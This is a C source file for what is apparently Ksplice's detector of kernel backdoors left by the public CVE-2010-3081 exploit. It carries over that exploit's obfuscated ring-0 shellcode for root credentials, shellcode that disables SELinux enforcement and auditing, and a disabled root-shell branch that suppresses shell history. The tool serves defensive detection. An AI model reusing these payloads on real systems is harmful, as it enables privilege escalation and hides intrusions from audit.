#include <poll.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sched.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ipc.h> 
#include <sys/msg.h>
#include <sys/resource.h>
#include <errno.h>


#define _GNU_SOURCE
#define __dgdhdytrg55 unsigned int
#define __yyrhdgdtfs66ytgetrfd unsigned long long
#define __dhdyetgdfstreg__ memcpy

#define BANNER "Diagnostic tool for public CVE-2010-3081 exploit -- Ksplice, Inc.\n" \
               "(see http://www.ksplice.com/uptrack/cve-2010-3081)\n" \
               "\n"

#define KALLSYMS              "/proc/kallsyms"
#define TMAGIC_66TDFDRTS      "/proc/timer_list"
#define SELINUX_PATH          "/selinux/enforce"
#define RW_FOPS               "timer_list_fops"
#define PER_C_DHHDYDGTREM7765 "per_cpu__current_task"
#define PREPARE_GGDTSGFSRFSD  "prepare_creds"
#define OVERRIDE_GGDTSGFSRFSD "override_creds"
#define REVERT_DHDGTRRTEFDTD  "revert_creds"
#define Y0Y0SMAP              0x100000UL
#define Y0Y0CMAP              0x200000UL
#define Y0Y0STOP              (Y0Y0SMAP+0xFFC)
#define J0J0S                 0x00200000UL
#define J0J0R00T              0x002000F0UL
#define PAGE_SIZE             0x1000

#define KERN_DHHDYTMLADSFPYT     0x1
#define KERN_DGGDYDTEGGETFDRLAK  0x2
#define KERN_HHSYPPLORQTWGFD     0x4 


#define KERN_DIS_GGDYYTDFFACVFD_IDT      0x8
#define KERN_DIS_DGDGHHYTTFSR34353_FOPS     0x10
#define KERN_DIS_GGDHHDYQEEWR4432PPOI_LSM      0x20

#define KERN_DIS_GGSTEYGDTREFRET_SEL1NUX  0x40

#define isRHHGDPPLADSF(ver) (strstr(ver, ".el4") || strstr(ver,".el5"))

#define __gggdfstsgdt_dddex(f, a...) do { fprintf(stdout, f, ## a); } while(0)
#define __pppp_tegddewyfg(s) do { fprintf(stdout, "%s", s); } while(0)
/* #define __print_verbose(s) do { fprintf(stdout, "%s", s); } while(0) */
#define __print_verbose(s) do { } while (0)
#define __xxxfdgftr_hshsgdt(s) do { perror(s); exit(-1); } while(0)
#define __yyy_tegdtfsrer(s) do { fprintf(stderr, s); exit(-1); } while(0)

static char buffer[1024];
static int s;
static int flags=0;
volatile static socklen_t magiclen=0;
static int useidt=1, usefops=0, uselsm=0;
static __yyrhdgdtfs66ytgetrfd _m_fops=0,_m_cred[3] = {0,0,0};
static __dgdhdytrg55 _m_cpu_off=0;
static char krelease[64];
static char kversion[128];

#define R0C_0FF 14
static char ttrg0ccc[]=
"\x51\x57\x53\x56\x48\x31\xc9\x48\x89\xf8\x48\x31\xf6\xbe\x41\x41\x41\x41"  
"\x3b\x30\x75\x1f\x3b\x70\x04\x75\x1a\x3b\x70\x08\x75\x15\x3b\x70\x0c"   
"\x75\x10\x48\x31\xdb\x89\x18\x89\x58\x04\x89\x58\x08\x89\x58\x0c\xeb\x11"     
"\x48\xff\xc0\x48\xff\xc1\x48\x81\xf9\x4c\x04\x00\x00\x74\x02"                   
"\xeb\xcc\x5e\x5b\x5f\x59\xc3";               


#define R0YTTTTUHLFSTT_OFF1 5
#define R0YGGSFDARTDF_DHDYTEGRDFD_D 21
#define R0TDGFSRSLLSJ_SHSYSTGD 45
char r1ngrrrrrrr[]=
"\x53\x52\x57\x48\xbb\x41\x41\x41\x41\x41\x41\x41\x41\xff\xd3"                                 
"\x50\x48\x89\xc7\x48\xbb\x42\x42\x42\x42\x42\x42\x42\x42"  
"\xff\xd3\x48\x31\xd2\x89\x50\x04\x89\x50\x14\x48\x89\xc7"                              
"\x48\xbb\x43\x43\x43\x43\x43\x43\x43\x43"   
"\xff\xd3\x5f\x5f\x5a\x5b\xc3";                                       


#define RJMPDDTGR_OFF 13
#define RJMPDDTGR_DHDYTGSCAVSF 7
#define RJMPDDTGR_GDTDGTSFRDFT 25
static char ttrfd0[]=
"\x57\x50\x65\x48\x8b\x3c\x25\x00\x00\x00\x00"
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xd0"                      
"\x58\x5f"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xc3";


/* implement selinux bypass for IDT ! */
#define RJMPDDTGR_OFF_IDT 14
#define RJMPDDTGR_DYHHTSFDARE 8
#define RJMPDDTGR_DHDYSGTSFDRTAC_SE 27
static char ruujhdbgatrfe345[]=
"\x0f\x01\xf8\x65\x48\x8b\x3c\x25\x00\x00\x00\x00"      
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xd0"                                  
"\x0f\x01\xf8"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x48\xcf";  



#define CJE_4554TFFDTRMAJHD_OFF  10
#define RJMPDDTGR_AYYYDGTREFCCV7761_OF      23
static char dis4blens4sel1nuxhayettgdr64545[]=
"\x41\x52\x50"
"\xb8\x00\x00\x00\x00"
"\x49\xba\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x89\x02"
"\x49\xba\x42\x42\x42\x42\x42\x42\x42\x42"
"\x41\x89\x02"
"\x58\x41\x5a";           




/* rhel LSM stuffs */
#define RHEL_LSM_OFF 98

struct LSM_rhel 
{ 
  __yyrhdgdtfs66ytgetrfd selinux_ops;
  __yyrhdgdtfs66ytgetrfd capability_ops;
  __yyrhdgdtfs66ytgetrfd dummy_security_ops;

  __yyrhdgdtfs66ytgetrfd selinux_enforcing;
  __yyrhdgdtfs66ytgetrfd audit_enabled;

  const char *krelease; 
  const char *kversion;
 
};

struct LSM_rhel known_targets[4]=
{
  {
    0xffffffff8031e600ULL,
    0xffffffff8031fec0ULL,
    0xffffffff804acc00ULL,

    0xffffffff804af960ULL,
    0xffffffff8049b124ULL,

    "2.6.18-164.el5",
    "#1 SMP Thu Sep 3 03:28:30 EDT 2009"  // to manage minor/bug fix changes
  },
  {
   0xffffffff8031f600ULL,
   0xffffffff80320ec0ULL,
   0xffffffff804afc00ULL,

   0xffffffff804b2960ULL,
   0xffffffff8049e124ULL,

   "2.6.18-164.11.1.el5",
   "#1 SMP Wed Jan 6 13:26:04 EST 2010"
  },
  {
    0xffffffff805296a0ULL,
    0xffffffff8052af60ULL,
    0xffffffff806db1e0ULL,

    0xffffffff806ddf40ULL,
    0xffffffff806d5324ULL,

    "2.6.18-164.11.1.el5xen",
    "#1 SMP Wed Jan 20 08:06:04 EST 2010"   // default xen
  },
  {
    0xffffffff8031f600ULL,// d selinux_ops
    0xffffffff80320ec0ULL,// d capability_ops
    0xffffffff804afc00ULL,// B dummy_security_ops

    0xffffffff804b2960ULL,// B selinux_enforcing
    0xffffffff8049e124ULL,// B audit_enabled

    "2.6.18-164.11.1.el5",
    "#1 SMP Wed Jan 20 07:32:21 EST 2010" // tripwire target LoL
   }

};

static struct LSM_rhel *curr_target=NULL, dyn4nt4n1labeggeyrthryt;

static int isSelinuxEnabled()
{
  FILE *selinux_f;
  selinux_f = fopen(SELINUX_PATH, "r");
  if(selinux_f == NULL)
  {
    if(errno == EPERM)
      return 1;
    else 
     return 0;
  }

  fclose(selinux_f);
  return 1;
}

static int wtfyourunhere_heee(char *out_release, char* out_version)
{
 int ret; const char*ptr;
 int count=0;
 char r[32], *bptr;
 struct utsname buf;
 ret =  uname(&buf);

 if(ret < 0)
   return -1; 
 
 strcpy(out_release, buf.release);
 strcpy(out_version, buf.version);

 ptr = buf.release;
 bptr = r;
 memset(r, 0x00, sizeof(r)); 
 while(*ptr)
 {
   if(count == 2)
    {
      if(*ptr >= '0' && *ptr <= '9')
        *bptr++ = *ptr;
      else
        break;
    }
 
   if(*ptr == '.')
     count++;
   ptr++;
 }

 if(strlen(r) < 1 || !atoi(r))
   return -1; 

 return atoi(r); 
}


static void p4tch_sel1nux_codztegfaddczda(struct LSM_rhel *table)
{
  *((__yyrhdgdtfs66ytgetrfd *)(dis4blens4sel1nuxhayettgdr64545 + CJE_4554TFFDTRMAJHD_OFF)) = table->selinux_enforcing;
  *((__yyrhdgdtfs66ytgetrfd *)(dis4blens4sel1nuxhayettgdr64545 + RJMPDDTGR_AYYYDGTREFCCV7761_OF)) = table->audit_enabled;
  __dhdyetgdfstreg__(ttrfd0 + RJMPDDTGR_GDTDGTSFRDFT, dis4blens4sel1nuxhayettgdr64545, sizeof(dis4blens4sel1nuxhayettgdr64545)-1); 
  __dhdyetgdfstreg__(ruujhdbgatrfe345 + RJMPDDTGR_DHDYSGTSFDRTAC_SE, dis4blens4sel1nuxhayettgdr64545, sizeof(dis4blens4sel1nuxhayettgdr64545)-1); 
}


static __yyrhdgdtfs66ytgetrfd get_sym_ex(const char* s, const char* filename, int ignore_flag)
{
  FILE *ka;
  char line[512];
  char reloc_a[64];
  char reloc[64];

  if(!(flags & KERN_HHSYPPLORQTWGFD) && !ignore_flag)
    return 0;
  
  ka = fopen(filename, "r");
  if(!ka)
    return 0;

  while(fgets(line, 512, ka) != NULL)
  {
    char *l_p  = line;
    char *ra_p = reloc_a;
    char *r_p    = reloc;
    memset(reloc, 0x00, sizeof(reloc));
    memset(reloc_a, 0x00, sizeof(reloc_a));
    while(*l_p != ' ' && (ra_p - reloc_a)  < 64)
      *ra_p++ = *l_p++;  
    l_p += 3;
    while(*l_p != ' ' && *l_p != '\n' && *l_p != '\t' && (r_p - reloc) < 64)
      *r_p++ = *l_p++;

    if(!strcmp(reloc, s))
    {
      return strtoull(reloc_a, NULL, 16); 
    }
  }

  return 0; 
}


static inline __yyrhdgdtfs66ytgetrfd get_sym(const char* s)
{
  return get_sym_ex(s, KALLSYMS, 0);
}

static int parse_cred(const char* val)
{
  int i=0;
  const char* p = val;
  char local[64], *l;
  for(i=0; i<3; i++)  
  {
    memset(local, 0x00, sizeof(local));
    l = local;
    while(*p && *p != ',')
      *l++ = *p++;

    if(!(*p) && i != 2)
      return -1;

    _m_cred[i] = strtoull(local, NULL, 16);
    p++;
  }
 
  return 0; 
}


#define SELINUX_OPS        "selinux_ops"
#define DUMMY_SECURITY_OPS "dummy_security_ops"
#define CAPABILITY_OPS     "capability_ops"
#define SELINUX_ENFORCING  "selinux_enforcing"
#define AUDIT_ENABLED      "audit_enabled"

struct LSM_rhel *lsm_rhel_find_target(int check_rhel)
{
   int i;
   char mapbuf[128];
   struct LSM_rhel *lsm = &(known_targets[0]);

   if(check_rhel && !isRHHGDPPLADSF(krelease))
   {
     __pppp_tegddewyfg("!!! Not a RHEL kernel, will skip LSM method \n");
     return NULL;
   }

   __print_verbose("$$$ Looking for known RHEL kernels.. \n");
   for(i=0; i<sizeof(known_targets)/sizeof(struct LSM_rhel); i++, lsm++)
   {
     if(!strcmp(krelease, lsm->krelease) && !strcmp(kversion, lsm->kversion))
     {
       __gggdfstsgdt_dddex("$$$ Known target kernel: %s %s \n", lsm->krelease, lsm->kversion);
       return lsm;
     }
   }

   __print_verbose("$$$ Locating symbols for new target...\n");
   strcpy(mapbuf, "/boot/System.map-");
   strcat(mapbuf, krelease);

   dyn4nt4n1labeggeyrthryt.selinux_ops        = get_sym_ex(SELINUX_OPS, mapbuf, 1);
   dyn4nt4n1labeggeyrthryt.dummy_security_ops = get_sym_ex(DUMMY_SECURITY_OPS, mapbuf, 1);
   dyn4nt4n1labeggeyrthryt.capability_ops     = get_sym_ex(CAPABILITY_OPS, mapbuf, 1);
   dyn4nt4n1labeggeyrthryt.selinux_enforcing  = get_sym_ex(SELINUX_ENFORCING, mapbuf, 1);
   dyn4nt4n1labeggeyrthryt.audit_enabled      = get_sym_ex(AUDIT_ENABLED, mapbuf, 1);


   if(!dyn4nt4n1labeggeyrthryt.selinux_ops ||
      !dyn4nt4n1labeggeyrthryt.dummy_security_ops ||
      !dyn4nt4n1labeggeyrthryt.capability_ops ||
      !dyn4nt4n1labeggeyrthryt.selinux_enforcing ||
      !dyn4nt4n1labeggeyrthryt.audit_enabled)
	return NULL;


   return &dyn4nt4n1labeggeyrthryt;
}

void error_no_symbol(const char *symbol)
{
  fprintf(stderr,
          "!!! Could not find symbol: %s\n"
          "\n"
          "A symbol required by the published exploit for CVE-2010-3081 is not\n"
          "provided by your kernel.  The exploit would not work on your system.\n",
          symbol);
  exit(-1);
}

static void put_your_hands_up_hooker(int argc, char *argv[])
{
  int fd,ver,ret;
  char __b[16];


  fd = open(KALLSYMS, O_RDONLY);
  ret = read(fd, __b, 16); // dummy read
  if((fd >= 0 && ret > 0))
  {
    __print_verbose("$$$ can read /proc/kallsyms, will use for convenience\n"); // d0nt p4tch m3 br0
    flags |= KERN_HHSYPPLORQTWGFD;
  }
  close(fd);

  ver = wtfyourunhere_heee(krelease, kversion);
  if(ver < 0)
    __yyy_tegdtfsrer("!!! uname failed\n");

  __gggdfstsgdt_dddex("$$$ Kernel release: %s\n", krelease);


  if(argc != 1)
  {
    while( (ret = getopt(argc, argv, "sflc:k:o:")) > 0)
    {
      switch(ret)
      {
        case 'f':
          flags |= KERN_DIS_GGDHHDYQEEWR4432PPOI_LSM|KERN_DIS_GGDYYTDFFACVFD_IDT;
          break;
	
	case 'l':
	  flags |= KERN_DIS_GGDYYTDFFACVFD_IDT|KERN_DIS_DGDGHHYTTFSR34353_FOPS;
	  break;

        case 'c':
          if(!optarg || parse_cred(optarg) < 0)
              __yyy_tegdtfsrer("!!! Unable to parse cred codes\n");
          break;

        case 'k':
          if(optarg)
            _m_fops = strtoull(optarg, NULL, 16);
          else
	     __yyy_tegdtfsrer("!!! Unable to parse fops numbers\n");
          break;

        case 's':
          if(!isSelinuxEnabled())
            __pppp_tegddewyfg("??? -s ignored: SELinux not enabled\n");
          else
            flags |= KERN_DIS_GGSTEYGDTREFRET_SEL1NUX;
          break;
            
        case 'o':
          if(optarg)
            _m_cpu_off = strtoull(optarg, NULL, 16);
	  else
	    __yyy_tegdtfsrer("!!! Unable to parse cpu_off numbers\n");
          break;
      }
    }
  }


  if(ver >= 29) // needs cred structure 
  {
    flags |= KERN_DGGDYDTEGGETFDRLAK;
  
    if(!_m_cred[0] || !_m_cred[1] || !_m_cred[2])
    {
      _m_cred[0] = get_sym(PREPARE_GGDTSGFSRFSD);
      _m_cred[1] = get_sym(OVERRIDE_GGDTSGFSRFSD); 
      _m_cred[2] = get_sym(REVERT_DHDGTRRTEFDTD);
    }

    if(!_m_cred[0])
      error_no_symbol("prepare_creds");
    if(!_m_cred[1])
      error_no_symbol("override_creds");
    if(!_m_cred[2])
      error_no_symbol("revert_creds");
    
    __print_verbose("$$$ Kernel credentials detected\n");
    *((__yyrhdgdtfs66ytgetrfd *)(r1ngrrrrrrr + R0YTTTTUHLFSTT_OFF1)) = _m_cred[0];
    *((__yyrhdgdtfs66ytgetrfd *)(r1ngrrrrrrr + R0YGGSFDARTDF_DHDYTEGRDFD_D)) = _m_cred[1];
    *((__yyrhdgdtfs66ytgetrfd *)(r1ngrrrrrrr + R0TDGFSRSLLSJ_SHSYSTGD)) = _m_cred[2];
  }

  if(ver >= 30)  // needs cpu offset
  {
    flags |= KERN_DHHDYTMLADSFPYT;
    if(!_m_cpu_off)
    _m_cpu_off = (__dgdhdytrg55)get_sym(PER_C_DHHDYDGTREM7765);

    if(!_m_cpu_off)
      error_no_symbol("per_cpu__current_task");

    __print_verbose("$$$ Kernel per_cpu relocs enabled\n");
    *((__dgdhdytrg55 *)(ttrfd0 + RJMPDDTGR_DHDYTGSCAVSF)) = _m_cpu_off;
    *((__dgdhdytrg55 *)(ruujhdbgatrfe345 + RJMPDDTGR_DYHHTSFDARE)) = _m_cpu_off;
  }
}


static void env_prepare(int argc, char* argv[])
{

  put_your_hands_up_hooker(argc, argv);

  if(!(flags & KERN_DIS_DGDGHHYTTFSR34353_FOPS))  // try fops
  {
    __print_verbose("??? Trying the timer_list_fops method\n");
    if(!_m_fops)
      _m_fops = get_sym(RW_FOPS);

    /* TODO: do RW check for newer -mm kernels which has timer_list_struct RO
     * Thanks to the guy who killed this vector... you know who you are:)
     * Lucky for you, there are more:) 
     */

    if(_m_fops) 
    {
      usefops=1;
    }
  }


  if(!(flags & KERN_DIS_GGDHHDYQEEWR4432PPOI_LSM)) // try lsm(rhel)
  {
    __print_verbose("??? Trying the LSM method\n");
    curr_target = lsm_rhel_find_target(1);
    if(!curr_target)
    {
       __print_verbose("!!! Unable to find target for LSM method\n"); 
    }
    else {
      uselsm=1;
    }
  }

 
  if(useidt && (flags & KERN_DIS_GGSTEYGDTREFRET_SEL1NUX))
  {
    // -i flag
    curr_target = lsm_rhel_find_target(0);
    if(!curr_target)
    {
       __pppp_tegddewyfg("!!! Unable to find target: continue without SELinux disabled\n");
       /* remove Selinux Flag */
       flags &= ~KERN_DIS_GGSTEYGDTREFRET_SEL1NUX;
    }
  }


  if(!usefops && !useidt && !uselsm)
    __yyy_tegdtfsrer("!!! All exploit methods failed.\n");  
}


static inline int get_socklen(__yyrhdgdtfs66ytgetrfd addr, __dgdhdytrg55 stack)
{
  int socklen_l = 8 + stack - addr - 16;
  return socklen_l;
}


static void __setmcbuffer(__dgdhdytrg55 value)
{
  int i;
  __dgdhdytrg55 *p = (__dgdhdytrg55*)buffer;
  for(i=0; i<sizeof(buffer)/sizeof(void*); i++)
    *(p+i) = value;
}


static void y0y0stack()
{
  void* map = mmap((void*)Y0Y0SMAP, 
                   PAGE_SIZE, 
                   PROT_READ|PROT_WRITE, 
                   MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 
                   -1,0);
  if(MAP_FAILED == map)
    __xxxfdgftr_hshsgdt("mmap"); 
}

static void y0y0code()
{
  void* map = mmap((void*)Y0Y0CMAP, 
                   PAGE_SIZE, 

#ifdef TRY_REMAP_DEFAULT 
		   PROT_READ|PROT_WRITE,
#else
                   PROT_READ|PROT_WRITE|PROT_EXEC, 
#endif
                   MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 
                   -1,0);
  if(MAP_FAILED == map)
    __xxxfdgftr_hshsgdt("mmap"); 

}


static int rey0y0code(unsigned long old)
{
  int fd;
  void *map;
  volatile char wizard;
  char cwd[1024];

  getcwd(cwd, sizeof(cwd));  
  strcat(cwd, "/__tmpfile");
 
  unlink(cwd);
  fd = open(cwd, O_RDWR|O_CREAT, S_IRWXU);
  if(fd < 0)
    return -1; 

  write(fd, (const void*)old, PAGE_SIZE); 
  if(munmap((void*)old, PAGE_SIZE) < 0)
    return -1;

  map = mmap((void*)old, 
                   PAGE_SIZE, 
                   PROT_READ|PROT_EXEC, 
                   MAP_PRIVATE|MAP_FIXED, 
                   fd,0);
  if(map == MAP_FAILED)
    return -1; 
 
  /* avoid lazy page fault handler 
   * Triple Fault when using idt vector 
   * and no pages are already mapped:)
   */

  wizard = *((char*)old);
  unlink(cwd);
  return wizard; 
}

void finish_shellcode()
{ 
  /* set shellcode level 2 */
  if(flags & KERN_DGGDYDTEGGETFDRLAK)
  {
    __print_verbose("$$$ Using cred shellcode\n");
    __dhdyetgdfstreg__((void*)J0J0R00T, r1ngrrrrrrr, sizeof(r1ngrrrrrrr));
  }
  else
  {
    __print_verbose("$$$ Using standard shellcode\n");
    __dhdyetgdfstreg__((void*)J0J0R00T,  ttrg0ccc, sizeof(ttrg0ccc));
    *((unsigned int*)(J0J0R00T + R0C_0FF)) = getuid();
  }

#ifdef TRY_REMAP_DEFAULT
  if(rey0y0code(Y0Y0CMAP) < 0)
    __yyy_tegdtfsrer("!!! Unable to remap\n");
#endif
}

int method_idt_main()
{
  __yyrhdgdtfs66ytgetrfd *patch;

  __print_verbose("$$$ Building shellcode - IDT method\n");   
  patch = (__yyrhdgdtfs66ytgetrfd*)(ruujhdbgatrfe345 + RJMPDDTGR_OFF_IDT);
  *patch = (__yyrhdgdtfs66ytgetrfd)(J0J0R00T);

  if(flags & KERN_DIS_GGSTEYGDTREFRET_SEL1NUX)
  {
    __print_verbose("$$$ including code to disable SELinux\n");
    p4tch_sel1nux_codztegfaddczda(curr_target);
  }
    
  __dhdyetgdfstreg__((void*)J0J0S,  ruujhdbgatrfe345, sizeof(ruujhdbgatrfe345));

  finish_shellcode();

  asm volatile("int $0xdd\t\n");

  return (getuid() == 0);
}

int method_idt()
{
  /* method_idt_main() crashes if no backdoor is present, so protect ourselves */
  int pid;

  pid = fork();
  if (pid < 0) {
    __xxxfdgftr_hshsgdt("!!! fork() failed");
    return 0; // error
  }

  if (pid == 0) {
    int r;
    struct rlimit rlim = {0, 0};
    setrlimit(RLIMIT_CORE, &rlim);
    r = method_idt_main();
    exit(r ? 0 : 1);
  }

  int status;
  waitpid(pid, &status, 0);
  if (status == 0)
    return method_idt_main();
  else
    return 0;
}

void prepare_fops_lsm_shellcode()
{
  __yyrhdgdtfs66ytgetrfd *patch;

  __print_verbose("$$$ Building shellcode - fops/LSM method\n");   
  patch = (__yyrhdgdtfs66ytgetrfd*)(ttrfd0 + RJMPDDTGR_OFF);
  *patch = (__yyrhdgdtfs66ytgetrfd)(J0J0R00T);

  __setmcbuffer(J0J0S);

  if(uselsm && (flags & KERN_DIS_GGSTEYGDTREFRET_SEL1NUX))
  {
      __print_verbose("$$$ including code to disable SELinux\n");
      p4tch_sel1nux_codztegfaddczda(curr_target);
  } 
  __dhdyetgdfstreg__((void*)J0J0S, ttrfd0, sizeof(ttrfd0));

  finish_shellcode();
}

int method_fops()
{
  int fd;
  struct pollfd pfd;

  prepare_fops_lsm_shellcode();

  fd = open(TMAGIC_66TDFDRTS, O_RDONLY);
  if(fd < 0)
    __xxxfdgftr_hshsgdt("!!! could not open /proc/timer_list");
  
  pfd.fd = fd;
  pfd.events = POLLIN | POLLOUT;
  poll(&pfd, 1, 0);

  return (getuid() == 0);
}

int method_lsm()
{
  int msqid;
  prepare_fops_lsm_shellcode();

  msqid = msgget(0, IPC_PRIVATE|0600);
  if(msqid < 0)
    __xxxfdgftr_hshsgdt("!!! msgget() failed");

  msgctl(msqid, IPC_RMID, (struct msqid_ds *) NULL); // exploit it

  return (getuid() == 0);
}

int main(int argc, char*argv[])
{
  int done;
  printf(BANNER);

  if (getuid() == 0) {
    fprintf(stderr, "!!! Must run as non-root.\n");
    return 1;
  }

  env_prepare(argc, argv);

  y0y0stack(); 
  y0y0code();

  done = 0;

  __pppp_tegddewyfg("$$$ Backdoor in LSM (1/3): ");
  if (uselsm) {
    __pppp_tegddewyfg("checking...");
    done = method_lsm();
    if (done)
      __pppp_tegddewyfg("PRESENT\n");
    else
      __pppp_tegddewyfg("not present.\n");
  } else {
    __pppp_tegddewyfg("not available.\n");
  }

  if (!done) {
    __pppp_tegddewyfg("$$$ Backdoor in timer_list_fops (2/3): ");
    if (usefops) {
      __pppp_tegddewyfg("checking...");
      done = method_fops();
      if (done)
        __pppp_tegddewyfg("PRESENT\n");
      else
        __pppp_tegddewyfg("not present.\n");
    } else {
      __pppp_tegddewyfg("not available.\n");
    }
  }

  if (!done) {
    __pppp_tegddewyfg("$$$ Backdoor in IDT (3/3): ");
    if (useidt) {
      __pppp_tegddewyfg("checking...");
      fflush(stdout);
      done = method_idt();
      if (done)
        __pppp_tegddewyfg("PRESENT\n");
      else
        __pppp_tegddewyfg("not present.\n");
    } else {
      __pppp_tegddewyfg("NOT CHECKING\n");
    }
  }

  munmap((void*)Y0Y0CMAP, PAGE_SIZE);

  /* exec */
  if(getuid() == 0)
  {
    pid_t pid;
    printf("\n"
           "Your in-memory kernel HAS A BACKDOOR that may have been left\n"
           "by the published exploit for CVE-2010-3081.\n"
           "\n"
           "More information is available at\n"
           "  http://www.ksplice.com/uptrack/cve-2010-3081\n"
           );
    if (0) {
      /* spawn root shell as demonstration */
      pid = fork();
      if(pid == 0)
      {
        char *args[] = {"/bin/sh", "-i", NULL};
        char *envp[] = {"TERM=linux", "BASH_HISTORY=/dev/null", "HISTORY=/dev/null", "history=/dev/null", "HISTFILE=/dev/null", "HISTFILESIZE=0",
                        "PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin", NULL };
        execve("/bin/sh", args, envp);
      } 
      else  
      {
        int status;
        waitpid(pid, &status, 0);
      }
    }
  }
  else {
    printf("\n"
           "Your system is free from the backdoors that would be left in memory\n"
           "by the published exploit for CVE-2010-3081.\n");
  }

  close(s);
  return 0;
}

